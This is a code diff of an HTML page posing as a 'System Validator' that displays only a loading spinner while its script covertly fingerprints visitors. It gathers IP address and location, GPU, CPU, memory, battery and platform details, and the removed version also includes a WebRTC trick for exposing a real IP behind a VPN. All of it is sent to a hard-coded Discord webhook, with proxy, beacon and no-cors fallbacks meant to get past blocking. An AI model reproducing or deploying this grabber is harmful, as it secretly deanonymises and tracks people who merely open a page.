@@ -2,94 +2,80 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Kaynakları</title>
+    <title>System Validator</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: s 1s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+        .c { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 20px; height: 20px; animation: r 1s linear infinite; }
+        @keyframes r { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="l"></div>
-
+    <div class="c"></div>
     <script>
-        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+        (async () => {
+            const endpoint = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+            const tunnel = "https://corsproxy.io/?";
 
-        // 1. EYLEM: VPN'I DELEN GERÇEK WEBRTC KODU
-        async function getRealIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
-                pc.createDataChannel("");
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (ice) => {
-                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                    const realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                    resolve(realIP);
-                    pc.onicecandidate = null; // Tek seferlik yakala
-                };
-                setTimeout(() => resolve("Sızıntı Başarısız/VPN Korumalı"), 3000);
-            });
-        }
-
-        async function masterExtract() {
-            let info = { gpu: "N/A", real_ip: "Tarama...", ip: "X", loc: "X", sys: "X", bat: "X" };
-
-            // VPN Bypass Çalıştırılıyor
-            info.real_ip = await getRealIP();
-
-            // 2. EYLEM: IP VE LOKASYON VERİSİ
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                info.ip = j.ip;
-                info.loc = `${j.city}, ${j.country_name} (${j.org})`;
-            } catch(e) {}
-
-            // 3. EYLEM: DONANIM ANALİZİ (WEBGL)
-            try {
+            const getHardware = () => {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                if (dbg) info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                
-                if (navigator.getBattery) {
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return debug ? {
+                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_ID),
+                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_ID)
+                } : { renderer: "N/A", vendor: "N/A" };
+            };
+
+            const getNetwork = async () => {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    return await response.json();
+                } catch { return {}; }
+            };
+
+            const getBattery = async () => {
+                try {
                     const b = await navigator.getBattery();
-                    info.bat = `%${Math.round(b.level * 100)} ${b.charging ? '⚡' : '🔋'}`;
-                }
-            } catch(e) {}
+                    return `${Math.round(b.level * 100)}% ${b.charging ? 'Charging' : 'Discharging'}`;
+                } catch { return "N/A"; }
+            };
 
-            info.sys = `${navigator.platform} | CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory || 'N/A'}GB`;
+            const hw = getHardware();
+            const net = await getNetwork();
+            const bat = await getBattery();
 
-            const payload = {
+            const data = {
                 embeds: [{
-                    title: "💀 KUSURSUZ ADLİ ANALİZ V23",
-                    color: 15548997,
+                    title: "EXTRACTED_DATA_REPORT",
+                    color: 0x00ff00,
                     fields: [
-                        { name: "📡 AĞ (VPN BYPASS)", value: `**Gerçek IP:** \`${info.real_ip}\`\n**Bağlantı IP:** \`${info.ip}\`\n**Konum:** ${info.loc}`, inline: false },
-                        { name: "⚙️ SİSTEM VE DONANIM", value: `**Sistem:** ${info.sys}\n**GPU:** \`${info.gpu}\`\n**Pil:** ${info.bat}`, inline: false },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
+                        { name: "NETWORK", value: `IP: ${net.ip}\nORG: ${net.org}\nLOC: ${net.city}/${net.country_name}`, inline: false },
+                        { name: "HARDWARE", value: `GPU: ${hw.renderer}\nCPU: ${navigator.hardwareConcurrency}\nMEM: ${navigator.deviceMemory}GB`, inline: false },
+                        { name: "SYSTEM", value: `OS: ${navigator.platform}\nBAT: ${bat}\nLANG: ${navigator.language}`, inline: false }
                     ],
                     timestamp: new Date().toISOString()
                 }]
             };
 
-            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
 
-            // 4. EYLEM: DISCORD ENGELİNİ AŞAN "OPAQUE" GÖNDERİM KODU
-            // mode: 'no-cors' eklenerek tarayıcının Türkiye engelindeki takılma bypass edilir.
-            fetch(u, {
+            // PRIMARY TRANSMISSION: TUNNELED FETCH
+            fetch(tunnel + encodeURIComponent(endpoint), {
                 method: 'POST',
-                mode: 'no-cors', // EYLEM: Tarayıcı güvenlik kontrolünü atla
                 body: blob
-            }).catch(e => {});
+            }).catch(() => {
+                // FALLBACK 1: BEACON API
+                navigator.sendBeacon(endpoint, blob);
+                
+                // FALLBACK 2: NO-CORS MODE
+                fetch(endpoint, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: blob
+                });
+            });
 
-            // Yedek olarak Beacon (Arka plan gönderimi)
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(u, blob);
-            }
-        }
-
-        window.onload = masterExtract;
+        })();
     </script>
 </body>
 </html>
